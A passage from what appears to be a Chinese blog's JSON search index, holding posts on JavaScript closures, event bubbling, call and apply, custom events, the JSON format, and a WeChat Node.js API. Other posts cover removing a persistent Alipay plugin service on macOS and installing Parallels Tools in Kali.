下面还有一个例子，logHello被赋值自执行函数返回的一个对象，这个对象里面包含了两个方法”read”和”write”，这两个方法都属于闭包，他们都有权访问log_name变量。”read”负责读取log_name这个变量的值,而”write”负责重写log_name的值，在外部是没有任何情况直接访问log_name变量的，只能通过这两个方法来进行间接的访问和设置这个变量，这样的方法同样属于闭包。\n1 var logHello; 2 3 logHello = ( function () { 4 5 var log\\_name = \u0026#39;wyz\u0026#39;; 6 7 return { 8 read: function () { 9 return log\\_name; 10 }, 11 12 write: function (newValue) { 13 log\\_name = newValue; 14 } 15 }; 16 17 } )(); 闭包是怎么形成的？ 从上面可以知道判断一个变量是否可以回收，根据这个变量的是否被引用就可以判断，比如下面例中，局部变量log_name被返回的匿名函数引用，那么就不会被垃圾回收器回收，这就是闭包的形成，因为闭包会保持对变量引用，让垃圾回收器不会回收此变量。","title":"浅谈Javascript闭包"},{"content":"事件流 在理解这两个概念之前可以先来理解一个概念叫：事件流，指的是触发事件的先后顺序。可以把事件冒泡和事件捕获想成对于事件流的一种实现方式。\n很久之前IE和网景公司对于事件实现的时候产生一个方面的共识，那就是当我们点击一个网页的时候，点击页面内任何一个元素，那么点击的不只是那一个元素，而是整个页面。相当于一个同心圆，我们手指指向中心的时候，其实指向的不只是中心圆，而是所有的圆。如下图。但是在关于如何实现事件流的时候，两个公司却给出了截然相反的理念。\n事件冒泡 这个由微软提出并使用在IE浏览器中，事件冒泡的基本理念是从特定目标到不特定目标的顺序进行触发。那么触发的顺序就如同下图：\n如有下例一个页面：\n1 2 3 4 5 6 7 8 9 当我们点击页面内的input元素的时候，如果只看这个结构里面的内容，那么触发的顺序为：input \u0026raquo; body \u0026raquo; html\n事件捕获 这个由网景公司提出，事件捕获的基本理念是从不特定目标到特定目标的顺序进行触发。那么触发的顺序如下图：\n如有下例一个页面：\n1 \u0026lt;html\\\u0026gt; 2 3 \u0026lt;body\\\u0026gt; 4 5 \u0026lt;input type\\=“submit” /\u0026gt; 6 7 \u0026lt;/body\\\u0026gt; 8 9 \u0026lt;/html\\\u0026gt; 当我们点击页面内的input元素的时候，如果只看这个结构里面的内容，那么触发的顺序为：html \u0026raquo; body \u0026raquo; input\nDOM2级事件 W3C在很久之前就着手规划事件，把事件分为两个部分，第一个部分为事件捕获阶段，第二个部分为事件冒泡阶段。相当于每个事件经历了两个步骤，一个为事件捕获，一个为事件冒泡，就如下图一样：\n关于兼容问题，从IE9开始的浏览器以及现在的Safari、firefox、chrome、opera浏览器都支持DOM2级事件，但是如果要兼容IE9以下的浏览器，那就需要使用时间冒泡类型来兼容IE9以后的浏览器了。\n","permalink":"/posts/js-event/","summary":"事件流 在理解这两个概念之前可以先来理解一个概念叫：事件流，指的是触发事件的先后顺序。可以把事件冒泡和事件捕获想成对于事件流的一种实现方式。\n很久之前IE和网景公司对于事件实现的时候产生一个方面的共识，那就是当我们点击一个网页的时候，点击页面内任何一个元素，那么点击的不只是那一个元素，而是整个页面。相当于一个同心圆，我们手指指向中心的时候，其实指向的不只是中心圆，而是所有的圆。如下图。但是在关于如何实现事件流的时候，两个公司却给出了截然相反的理念。\n事件冒泡 这个由微软提出并使用在IE浏览器中，事件冒泡的基本理念是从特定目标到不特定目标的顺序进行触发。那么触发的顺序就如同下图：\n如有下例一个页面：\n1 2 3 4 5 6 7 8 9 当我们点击页面内的input元素的时候，如果只看这个结构里面的内容，那么触发的顺序为：input \u0026raquo; body \u0026raquo; html\n事件捕获 这个由网景公司提出，事件捕获的基本理念是从不特定目标到特定目标的顺序进行触发。那么触发的顺序如下图：\n如有下例一个页面：\n1 \u0026lt;html\\\u0026gt; 2 3 \u0026lt;body\\\u0026gt; 4 5 \u0026lt;input type\\=“submit” /\u0026gt; 6 7 \u0026lt;/body\\\u0026gt; 8 9 \u0026lt;/html\\\u0026gt; 当我们点击页面内的input元素的时候，如果只看这个结构里面的内容，那么触发的顺序为：html \u0026raquo; body \u0026raquo; input\nDOM2级事件 W3C在很久之前就着手规划事件，把事件分为两个部分，第一个部分为事件捕获阶段，第二个部分为事件冒泡阶段。相当于每个事件经历了两个步骤，一个为事件捕获，一个为事件冒泡，就如下图一样：\n关于兼容问题，从IE9开始的浏览器以及现在的Safari、firefox、chrome、opera浏览器都支持DOM2级事件，但是如果要兼容IE9以下的浏览器，那就需要使用时间冒泡类型来兼容IE9以后的浏览器了。","title":"事件捕获与事件冒泡"},{"content":"1、前言 ECMAscript中提供了两个方法(call,apply)用于改变对象内部的this指针，它们两个的作用都是一样的，但是传递的参数有点不大相同。\n它们的大概语法为：\ncall(this, arg1, arg2, arg3, …..) apply(this, arguments);\n它们第一个参数都是需要改变指针的对象，之后的参数是传递给在调用call方法的函数需要的参数。\ncall之后的需要传递多少参数就传递多少参数，而apply传递的是一个参数数组，它们两个有什么不一样？call是在明确知道参数有多少个的情况下使用，而apply是相对于不清楚有多少个参数的时候使用的。\n2、它们有什么作用？ 比如在很多情况下，操作DOM返回的NodeList类型的值是一个类数组，相当于有数组的基本特征但是没有数组的很多方法，所以这个时候就需要用call方法调用Array数组类型的一些方法。\n具体这这两个方法有什么用？还是实例来说明吧！\n1 var a = { 2 3 value: 10 4 5 }; 6 7 var b = { 8 9 setValue: function(num){ 10 11 this.value = this.value + num; 12 13 } 14 15 } 16 17 b.setValue.call(a, 20); \u0026lt;\u0026lt;执行过后，a.value等于30; 其实不难看出上例中，call方法改变了b.setValue函数中的this指针，this从而指向了a对象的value值。\n关于apply，更多的是运用在函数内部，因为在函数内部有一个arguments数组，当然也可以直接传递一个数组，这样就直接可以传入到apply方法，如下实例：\n1 var a = { 2 3 value: 10 4 5 }; 6 7 var b = { 8 9 setValue: function(num){ 10 11 this.value = this.value + num; 12 13 } 14 15 } 16 17 b.setValue.apply(a, \\[100, 20, 30\\]); \u0026lt;\u0026lt;执行过后，a.value等于110; ","permalink":"/posts/js-call-apply/","summary":"1、前言 ECMAscript中提供了两个方法(call,apply)用于改变对象内部的this指针，它们两个的作用都是一样的，但是传递的参数有点不大相同。\n它们的大概语法为：\ncall(this, arg1, arg2, arg3, …..) apply(this, arguments);\n它们第一个参数都是需要改变指针的对象，之后的参数是传递给在调用call方法的函数需要的参数。\ncall之后的需要传递多少参数就传递多少参数，而apply传递的是一个参数数组，它们两个有什么不一样？call是在明确知道参数有多少个的情况下使用，而apply是相对于不清楚有多少个参数的时候使用的。\n2、它们有什么作用？ 比如在很多情况下，操作DOM返回的NodeList类型的值是一个类数组，相当于有数组的基本特征但是没有数组的很多方法，所以这个时候就需要用call方法调用Array数组类型的一些方法。\n具体这这两个方法有什么用？还是实例来说明吧！\n1 var a = { 2 3 value: 10 4 5 }; 6 7 var b = { 8 9 setValue: function(num){ 10 11 this.value = this.value + num; 12 13 } 14 15 } 16 17 b.setValue.call(a, 20); \u0026lt;\u0026lt;执行过后，a.value等于30; 其实不难看出上例中，call方法改变了b.setValue函数中的this指针，this从而指向了a对象的value值。\n关于apply，更多的是运用在函数内部，因为在函数内部有一个arguments数组，当然也可以直接传递一个数组，这样就直接可以传入到apply方法，如下实例：\n1 var a = { 2 3 value: 10 4 5 }; 6 7 var b = { 8 9 setValue: function(num){ 10 11 this.","title":"Call与Apply"},{"content":"1、前言 首先我喜欢看一些创业的书，很多书里都会有马云的身影，马云也算是对我有一定的影响，从而我对淘宝也产生了一定的好感。但是关于这次插件事情，我对阿里产生了一些排斥的心里作用。我并不想吐槽淘宝，也不是吐槽马云，阿里不是万达，整个阿里并不是马云想干啥就干啥，所以这些事情也不可能说是马云的一句之作，我看见网上很多人因为这个事情在吐槽马云，我都为马云兄背黑锅这件事情感到蛋疼。仁者见仁智者见智吧！\n2、可疑进程 无意中看到一篇文章在说Mac上支付宝插件有点异常，我查看了自己的进程，发现确实存在一个可疑的“AlipayDispatcherService”进程，同时这个进程会监控浏览器的配置文件，通过kill结束这个进程后发现“AlipayDispatcherService”进程会再次启动，我找出了以下两个相关的阿里服务：\ncom.alipay.refresher.plist com.alipay.DispatcherService.plist 发现“com.alipay.DispatcherService.plist”服务调用“com.alipay.refresher.plist”服务不断重启“AlipayDispatcherService”，理清楚调用顺序过后，关闭这个进程相对简单了，首先禁用两个服务：\n\u0026lt;pre class=\u0026#34;prettyprint\u0026#34; prettyprinted=\u0026#34;\u0026#34;\u0026gt;\u0026lt;span class=\u0026#34;pln\u0026#34;\u0026gt;sudo launchctl unload \u0026lt;span class=\u0026#34;pun\u0026#34;\u0026gt;/\u0026lt;span class=\u0026#34;typ\u0026#34;\u0026gt;Library\u0026lt;span class=\u0026#34;pun\u0026#34;\u0026gt;/\u0026lt;span class=\u0026#34;typ\u0026#34;\u0026gt;LaunchDaemons\u0026lt;span class=\u0026#34;pun\u0026#34;\u0026gt;/\u0026lt;span class=\u0026#34;pln\u0026#34;\u0026gt;com\u0026lt;span class=\u0026#34;pun\u0026#34;\u0026gt;.\u0026lt;span class=\u0026#34;pln\u0026#34;\u0026gt;alipay\u0026lt;span class=\u0026#34;pun\u0026#34;\u0026gt;.\u0026lt;span class=\u0026#34;typ\u0026#34;\u0026gt;DispatcherService\u0026lt;span class=\u0026#34;pun\u0026#34;\u0026gt;.\u0026lt;span class=\u0026#34;pln\u0026#34;\u0026gt;plist sudo launchctl unload \u0026lt;span class=\u0026#34;pun\u0026#34;\u0026gt;~\u0026lt;span class=\u0026#34;str\u0026#34;\u0026gt;/Library/\u0026lt;span class=\u0026#34;typ\u0026#34;\u0026gt;LaunchAgents\u0026lt;span class=\u0026#34;pun\u0026#34;\u0026gt;/\u0026lt;span class=\u0026#34;pln\u0026#34;\u0026gt;com\u0026lt;span class=\u0026#34;pun\u0026#34;\u0026gt;.\u0026lt;span class=\u0026#34;pln\u0026#34;\u0026gt;alipay\u0026lt;span class=\u0026#34;pun\u0026#34;\u0026gt;.\u0026lt;span class=\u0026#34;pln\u0026#34;\u0026gt;refresher\u0026lt;span class=\u0026#34;pun\u0026#34;\u0026gt;.\u0026lt;span class=\u0026#34;pln\u0026#34;\u0026gt;plist\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt; 然后执行命令结束掉“AlipayDispatcherService”进程：\n\u0026lt;pre class=\u0026#34;prettyprint\u0026#34; prettyprinted=\u0026#34;\u0026#34;\u0026gt;\u0026lt;span class=\u0026#34;pln\u0026#34;\u0026gt;kill \u0026lt;span class=\u0026#34;pun\u0026#34;\u0026gt;-\u0026lt;span class=\u0026#34;lit\u0026#34;\u0026gt;9\u0026lt;span class=\u0026#34;pln\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;typ\u0026#34;\u0026gt;AlipayDispatcherService\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt; 3、找出藏身之地 我查看了支付宝插件包里面的“preinstall”文件，列出了一些目录安装文件的目录，可以通过查看是否存在相关文件进一步确认并删除：\n~/Library/Alipay /Library/Application Support/Alipay /Library/LaunchDaemons/com.alipay.DispatcherService.plist ~/Library/LaunchAgents/com.alipay.refresher.plist ~/Library/Internet Plug-Ins/ali_(npali_).plugin 4、正确姿势安装 首先到官方下载名为wkaliedit.dmg的插件包 然后载入过后提取installer.pkg文件，解压installer.pkg包提取output.pkg包 右键显示包内容打开output.pkg包，解压Payload包(此包为gzip格式，如果不能直接解压，请在终端下解压(tar zxvf Payload))，得到alipay包 右键显示包内容打开alipay包，依次进入Contents-Resources，找到其中两个zip包，aliedit.zip和npalicdo.zip 解压两个包，并把解压的两个文件“aliedit.plugin”、“npalicdo.plugin”放到”~/Library/Internet Plug-Ins文件下 重启浏览器 ","permalink":"/posts/mac-alipay-plugins/","summary":"1、前言 首先我喜欢看一些创业的书，很多书里都会有马云的身影，马云也算是对我有一定的影响，从而我对淘宝也产生了一定的好感。但是关于这次插件事情，我对阿里产生了一些排斥的心里作用。我并不想吐槽淘宝，也不是吐槽马云，阿里不是万达，整个阿里并不是马云想干啥就干啥，所以这些事情也不可能说是马云的一句之作，我看见网上很多人因为这个事情在吐槽马云，我都为马云兄背黑锅这件事情感到蛋疼。仁者见仁智者见智吧！\n2、可疑进程 无意中看到一篇文章在说Mac上支付宝插件有点异常，我查看了自己的进程，发现确实存在一个可疑的“AlipayDispatcherService”进程，同时这个进程会监控浏览器的配置文件，通过kill结束这个进程后发现“AlipayDispatcherService”进程会再次启动，我找出了以下两个相关的阿里服务：\ncom.alipay.refresher.plist com.alipay.DispatcherService.plist 发现“com.alipay.DispatcherService.plist”服务调用“com.alipay.refresher.plist”服务不断重启“AlipayDispatcherService”，理清楚调用顺序过后，关闭这个进程相对简单了，首先禁用两个服务：\n\u0026lt;pre class=\u0026#34;prettyprint\u0026#34; prettyprinted=\u0026#34;\u0026#34;\u0026gt;\u0026lt;span class=\u0026#34;pln\u0026#34;\u0026gt;sudo launchctl unload \u0026lt;span class=\u0026#34;pun\u0026#34;\u0026gt;/\u0026lt;span class=\u0026#34;typ\u0026#34;\u0026gt;Library\u0026lt;span class=\u0026#34;pun\u0026#34;\u0026gt;/\u0026lt;span class=\u0026#34;typ\u0026#34;\u0026gt;LaunchDaemons\u0026lt;span class=\u0026#34;pun\u0026#34;\u0026gt;/\u0026lt;span class=\u0026#34;pln\u0026#34;\u0026gt;com\u0026lt;span class=\u0026#34;pun\u0026#34;\u0026gt;.\u0026lt;span class=\u0026#34;pln\u0026#34;\u0026gt;alipay\u0026lt;span class=\u0026#34;pun\u0026#34;\u0026gt;.\u0026lt;span class=\u0026#34;typ\u0026#34;\u0026gt;DispatcherService\u0026lt;span class=\u0026#34;pun\u0026#34;\u0026gt;.\u0026lt;span class=\u0026#34;pln\u0026#34;\u0026gt;plist sudo launchctl unload \u0026lt;span class=\u0026#34;pun\u0026#34;\u0026gt;~\u0026lt;span class=\u0026#34;str\u0026#34;\u0026gt;/Library/\u0026lt;span class=\u0026#34;typ\u0026#34;\u0026gt;LaunchAgents\u0026lt;span class=\u0026#34;pun\u0026#34;\u0026gt;/\u0026lt;span class=\u0026#34;pln\u0026#34;\u0026gt;com\u0026lt;span class=\u0026#34;pun\u0026#34;\u0026gt;.\u0026lt;span class=\u0026#34;pln\u0026#34;\u0026gt;alipay\u0026lt;span class=\u0026#34;pun\u0026#34;\u0026gt;.\u0026lt;span class=\u0026#34;pln\u0026#34;\u0026gt;refresher\u0026lt;span class=\u0026#34;pun\u0026#34;\u0026gt;.\u0026lt;span class=\u0026#34;pln\u0026#34;\u0026gt;plist\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt; 然后执行命令结束掉“AlipayDispatcherService”进程：\n\u0026lt;pre class=\u0026#34;prettyprint\u0026#34; prettyprinted=\u0026#34;\u0026#34;\u0026gt;\u0026lt;span class=\u0026#34;pln\u0026#34;\u0026gt;kill \u0026lt;span class=\u0026#34;pun\u0026#34;\u0026gt;-\u0026lt;span class=\u0026#34;lit\u0026#34;\u0026gt;9\u0026lt;span class=\u0026#34;pln\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;typ\u0026#34;\u0026gt;AlipayDispatcherService\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt; 3、找出藏身之地 我查看了支付宝插件包里面的“preinstall”文件，列出了一些目录安装文件的目录，可以通过查看是否存在相关文件进一步确认并删除：\n~/Library/Alipay /Library/Application Support/Alipay /Library/LaunchDaemons/com.alipay.DispatcherService.plist ~/Library/LaunchAgents/com.alipay.refresher.plist ~/Library/Internet Plug-Ins/ali_(npali_).plugin 4、正确姿势安装 首先到官方下载名为wkaliedit.dmg的插件包 然后载入过后提取installer.pkg文件，解压installer.pkg包提取output.pkg包 右键显示包内容打开output.pkg包，解压Payload包(此包为gzip格式，如果不能直接解压，请在终端下解压(tar zxvf Payload))，得到alipay包 右键显示包内容打开alipay包，依次进入Contents-Resources，找到其中两个zip包，aliedit.zip和npalicdo.zip 解压两个包，并把解压的两个文件“aliedit.plugin”、“npalicdo.plugin”放到”~/Library/Internet Plug-Ins文件下 重启浏览器 ","title":"Mac支付宝插件风波"},{"content":"自定义事件在很多地方都会用到，然后跟着书实例了几次，然后详细注释，也算给自己做了一个笔记。\n1 //定义一个自定义事件类 2 //定义一个实例属性用以单独为每一个实例创建独立的事件集 3 function EventTarget() { 4 5 this.handles = {}; 6 7 }; 8 9 EventTarget.prototype = { 10 11 //构造函数的指针指向事件本身 12 constructor: EventTarget, 13 14 15 //添加事件代码的函数，接受两个参数，一个为事件的类型一个为事件的处理程序 16 addHandle: function(type, handle) { 17 18 19 //检测添加的事件类型是否存在 20 if(typeof this.handles\\[type\\] == \u0026#39;undefined\u0026#39;){ 21 22 23 //如果不存在则新创建一个，类型为数组,如果存在则push进数组 24 this.handles\\[type\\] = \\[\\]; 25 }; 26 27 28 this.handles\\[type\\].push(handle); 29 30 }, 31 32 //事件触发函数，接受一个对象，对象至少包括一个type属性 33 fire: function(event) { 34 35 36 //检测传入进来的对象target属性是否存在，如果没有则设置一个指向当前实例的指针 37 if(!event.target) { 38 event.target = this; 39 }; 40 41 //检测传入的对象里面事件类型是否存在 42 if(this.handles\\[event.type\\] instanceof Array) { 43 44 45 //如果存在则把此事件集赋值给handles变量 46 var handles = this.handles\\[event.type\\]; 47 48 49 //循环检测事件集中的事件处理程序，并且执行每一个事件处理程序 50 var i; 51 for(i= 0, len = handles.length; i\u0026lt;len; i++) { 52 53 54 //执行事件处理程序，并且传入event对象 55 handles\\[i\\](event); 56 57 }; 58 59 } 60 61 }, 62 63 64 //删除事件程序，接受两个参数，一个为事件类型，一个为事件处理程序 65 removeHandles: function(type,handle) { 66 67 68 //检测事件类型是否存在 69 if(this.handles\\[type\\] instanceof Array) { 70 71 72 //把此事件的引用赋值给handles变量 73 var handles = this.handles\\[type\\]; 74 75 76 //循环此事件类型集 77 var i; 78 for(i= 0, len = handles.length; i \u0026lt; len; i++) { 79 80 81 //检查此事件集中每一个事件处理程序是否和传入进来的handle绝对等于。 82 if(handles\\[i\\] === handle) { 83 84 85 //如果等于跳出当前循环，不等于继续循环 86 break; 87 88 }; 89 90 }; 91 92 93 //通过数组的splice方法，把获取到的事件位置i值，已经数值1传入进splice方法删除事件处理程序。 94 handles.splice(i,1); 95 }; 96 }; 97 }; 98 ","permalink":"/posts/javascript-custom-event/","summary":"自定义事件在很多地方都会用到，然后跟着书实例了几次，然后详细注释，也算给自己做了一个笔记。\n1 //定义一个自定义事件类 2 //定义一个实例属性用以单独为每一个实例创建独立的事件集 3 function EventTarget() { 4 5 this.handles = {}; 6 7 }; 8 9 EventTarget.prototype = { 10 11 //构造函数的指针指向事件本身 12 constructor: EventTarget, 13 14 15 //添加事件代码的函数，接受两个参数，一个为事件的类型一个为事件的处理程序 16 addHandle: function(type, handle) { 17 18 19 //检测添加的事件类型是否存在 20 if(typeof this.handles\\[type\\] == \u0026#39;undefined\u0026#39;){ 21 22 23 //如果不存在则新创建一个，类型为数组,如果存在则push进数组 24 this.handles\\[type\\] = \\[\\]; 25 }; 26 27 28 this.handles\\[type\\].push(handle); 29 30 }, 31 32 //事件触发函数，接受一个对象，对象至少包括一个type属性 33 fire: function(event) { 34 35 36 //检测传入进来的对象target属性是否存在，如果没有则设置一个指向当前实例的指针 37 if(!","title":"Javascript自定义事件"},{"content":"JSON全称为：JavaScript Object Notation，中文为：Javascript对象表示法。是Douglas Crockford在2006年作为IETF RFC 4627提交给IETF，它是利用了Javascript中的一些结构模式来表示结构化数据。\nJSON优点 Javascript的表示结构 支持Javascript原生的类型的访问方式 Javascript对象数组和JSON数据格式转换很方便，也就是说可以以javascript对象形式去访问JSON数据格式 JSON容易产生的误解 JSON不是一门编程语言，是它只是一种用来表达数据结构的格式 JSON不是专门针对Javascript语言使用的数据格式，任何语言、程序都可以使用这种格式。 JSON和XML它们是两种不同的数据格式，都用于表达和序列数据。 目前浏览器都支持JSON数据格式，并提供了原生的JSON对象，JSON对象的语法可以表示以下三种类型的值，但是不支持Javascript中的函数、变量、对象实例：\n1、简单值：可以为数值、字符串、布尔值、null，但是不支持undefined值。\n如：1,”char”,true,null\n2、对象：可以为Javascript里的对象形式的值，在Javascript里面的对象属性名用引号或者不用引号，但是在JSON中必须用双引号包围属性名。\n如：{“Name”: “Nichole\u0026quot;}\n3、数组，可以为Javascript里的数组形式的值\n如：[15,true,false,”char\u0026quot;]\n通过这些类型可以组成更加复杂的类型，可以在对象里面嵌套数组，数组里面嵌套对象，或者对象嵌套对象、数组嵌套数组，如：\n1 \\[ { “name”: “Nikds”, “site”: \\[ “New York”, “Beijing\u0026#34; \\], “age”: 29 }, { “name”: “Wang”, “site”: \\[ “Hunan”, “Beijing\u0026#34; \\], “age”: 24 }, { “name”: “Jack”, “site”: \\[ “Sichuan”, “Guangzhou\u0026#34; \\], “age”: 21 } \\] JSON对象提供了两个方法分别为：\nstringify() 用于将Javascript对象序列化为JSON字符串，它接受三个参数，第一个为需要转换为JSON字符串的对象；第二个为过滤器可以为函数、数组；第三个参数为数值或者字符串来缩进或者填充，如下实例：\nvar ne1 = { \u0026#34;name\u0026#34;: \u0026#34;Nikds\u0026#34;, \u0026#34;site\u0026#34;: \\[ \u0026#34;New York\u0026#34;, \u0026#34;Beijing\u0026#34; \\], \u0026#34;age\u0026#34;: 29 }; JSON.stringify(ne1) \u0026#34;{\u0026#34;name\u0026#34;:\u0026#34;Nikds\u0026#34;,\u0026#34;site\u0026#34;:\\[\u0026#34;New York\u0026#34;,\u0026#34;Beijing\u0026#34;\\],\u0026#34;age\u0026#34;:29}” //输出结果 JSON.stringify(ne1,\\[\u0026#34;site\u0026#34;,\u0026#34;age\u0026#34;\\]) //过滤器输入数组，只会输出在数组内的出现的字符串的属性名和值。 \u0026#34;{\u0026#34;site\u0026#34;:\\[\u0026#34;New York\u0026#34;,\u0026#34;Beijing\u0026#34;\\],\u0026#34;age\u0026#34;:29}” //输出结果 JSON.stringify(ne1,function(key,value){ //通过函数过滤器来过滤数据，数据是根据函数返回的值来序列化数据的。函数如果返回undefind那么相应的属性就会被忽略，在其尾部一定要提供default，这样可以保证其他数据能正常输出。 switch(key){ case ’name’: return value = ‘Jacki’; case ’age’: return value = ’40\u0026#39;; default: return value; }; }); \u0026#34;{\u0026#34;name\u0026#34;:\u0026#34;Jacki\u0026#34;,\u0026#34;site\u0026#34;:\\[\u0026#34;New York\u0026#34;,\u0026#34;Beijing\u0026#34;\\],\u0026#34;age\u0026#34;:\u0026#34;40”}” //输出结果 JSON.stringify(ne1,\\[“site”,”age”\\],4) //过滤器输入数组，只会输出在数组内的出现的字符串的属性名和值，并且设置第三个值来控制结果中的空白和缩进，这样有助于代码的可阅读性。但是所有类型的缩进都不能超过10个字符，如果超过都会截掉10后们的字符串，以及大于10的数值会转换为10数值。 “{//输出结果 \u0026#34;site\u0026#34;:\\[\u0026#34;New York\u0026#34;,\u0026#34;Beijing\u0026#34;\\], \u0026#34;age\u0026#34;:29 }” JSON.stringify(ne1,\\[“site”,”age”\\],”---\u0026#34;) 也可以输入字符串来控制阅读性。 “{ //输出结果 ----\u0026#34;site\u0026#34;:\\[\u0026#34;New York\u0026#34;,\u0026#34;Beijing\u0026#34;\\], ----\u0026#34;age\u0026#34;:29 }” parse() 用于将JSON对象解析为Javascript对象,它接受两个个参数，第一个参数是需要转换为javascript对象的JSON数据，第二个参数是一个函数，函数接受两个值，一个是键一个是对应的值，为了区别该函数和stringify方法，把该方法称为还原函数。 函数接受两个值，如果函数返回undefind，则从结果中删除相应的键值，如果返回其他值，则将该值插入结果中。 在JSON中，是不能保存对象、函数、变量的，所以当我把一个new Date()转换为JSON格式是保存的一个字符串\nvar jsontext = \u0026#39;{\u0026#34;firstname\u0026#34;:\u0026#34;Jesper\u0026#34;,\u0026#34;surname\u0026#34;:\u0026#34;...e\u0026#34;:\\[\u0026#34;555-0100\u0026#34;,\u0026#34;555-0120\u0026#34;\\],\u0026#34;year\u0026#34;:\u0026#34;2011,11,3\u0026#34;}\u0026#39;; JSON.parse(jsontext,function(key,value) { if(key == \u0026#34;year\u0026#34;) { return new Date(value) } else { return value}; }); ","permalink":"/posts/json/","summary":"JSON全称为：JavaScript Object Notation，中文为：Javascript对象表示法。是Douglas Crockford在2006年作为IETF RFC 4627提交给IETF，它是利用了Javascript中的一些结构模式来表示结构化数据。\nJSON优点 Javascript的表示结构 支持Javascript原生的类型的访问方式 Javascript对象数组和JSON数据格式转换很方便，也就是说可以以javascript对象形式去访问JSON数据格式 JSON容易产生的误解 JSON不是一门编程语言，是它只是一种用来表达数据结构的格式 JSON不是专门针对Javascript语言使用的数据格式，任何语言、程序都可以使用这种格式。 JSON和XML它们是两种不同的数据格式，都用于表达和序列数据。 目前浏览器都支持JSON数据格式，并提供了原生的JSON对象，JSON对象的语法可以表示以下三种类型的值，但是不支持Javascript中的函数、变量、对象实例：\n1、简单值：可以为数值、字符串、布尔值、null，但是不支持undefined值。\n如：1,”char”,true,null\n2、对象：可以为Javascript里的对象形式的值，在Javascript里面的对象属性名用引号或者不用引号，但是在JSON中必须用双引号包围属性名。\n如：{“Name”: “Nichole\u0026quot;}\n3、数组，可以为Javascript里的数组形式的值\n如：[15,true,false,”char\u0026quot;]\n通过这些类型可以组成更加复杂的类型，可以在对象里面嵌套数组，数组里面嵌套对象，或者对象嵌套对象、数组嵌套数组，如：\n1 \\[ { “name”: “Nikds”, “site”: \\[ “New York”, “Beijing\u0026#34; \\], “age”: 29 }, { “name”: “Wang”, “site”: \\[ “Hunan”, “Beijing\u0026#34; \\], “age”: 24 }, { “name”: “Jack”, “site”: \\[ “Sichuan”, “Guangzhou\u0026#34; \\], “age”: 21 } \\] JSON对象提供了两个方法分别为：\nstringify() 用于将Javascript对象序列化为JSON字符串，它接受三个参数，第一个为需要转换为JSON字符串的对象；第二个为过滤器可以为函数、数组；第三个参数为数值或者字符串来缩进或者填充，如下实例：\nvar ne1 = { \u0026#34;name\u0026#34;: \u0026#34;Nikds\u0026#34;, \u0026#34;site\u0026#34;: \\[ \u0026#34;New York\u0026#34;, \u0026#34;Beijing\u0026#34; \\], \u0026#34;age\u0026#34;: 29 }; JSON.","title":"JSON数据格式"},{"content":"代码重要部分都已详细注释，test.js为实例，如果启动url请求，那么程序默认对json格式数据友好，如果有特殊需要，请自行修改返回数据的处理格式 大概功能简介为下：\nthis._token 提供token接口 this._getURL 提供get请求的url接口 this._getPort 提供get请求url的端口接口 this._message 提供静态响应消息的接口 this._user = []; 提供允许用户接入接口 app.listen 提供端口监听方法，此方法提供一个参数即端口号 地址：Click Me\n","permalink":"/posts/nodejs-publicwechat-api/","summary":"代码重要部分都已详细注释，test.js为实例，如果启动url请求，那么程序默认对json格式数据友好，如果有特殊需要，请自行修改返回数据的处理格式 大概功能简介为下：\nthis._token 提供token接口 this._getURL 提供get请求的url接口 this._getPort 提供get请求url的端口接口 this._message 提供静态响应消息的接口 this._user = []; 提供允许用户接入接口 app.listen 提供端口监听方法，此方法提供一个参数即端口号 地址：Click Me","title":"Nodejs微信公众号接口"},{"content":"今天在安装虚拟机里面安装kail，在安装虚拟机提供的tools时候提示没有权限，如图： 后面经过自己证实首先tools是挂载的cdrom，在这样挂载下是没有写权限的(类似于windows下面读取光盘光盘同样不能写入)，也就是说只有权限r-x r-x r-x权限，只有有读和执行权限，如图：\n但是我通过查看install文件内容，发现里面在执行的过程中会下载文件，也就是说会写文件，所以在这里没有权限，才会出现\u0026quot;permission denied\u0026quot;提示。 解决方法： 把挂载目录里面的所有东西全部拷贝到一个有rwx的目录进行执行\n1 cp -r ./\\* /tmp/tools/ ./install ","permalink":"/posts/kail-install-parallels-tools/","summary":"今天在安装虚拟机里面安装kail，在安装虚拟机提供的tools时候提示没有权限，如图： 后面经过自己证实首先tools是挂载的cdrom，在这样挂载下是没有写权限的(类似于windows下面读取光盘光盘同样不能写入)，也就是说只有权限r-x r-x r-x权限，只有有读和执行权限，如图：\n但是我通过查看install文件内容，发现里面在执行的过程中会下载文件，也就是说会写文件，所以在这里没有权限，才会出现\u0026quot;permission denied\u0026quot;提示。 解决方法： 把挂载目录里面的所有东西全部拷贝到一个有rwx的目录进行执行\n1 cp -r ./\\* /tmp/tools/ ./install ","title":"Kail安装Parallels tools"},{"content":"HTML5定义了一些javascript 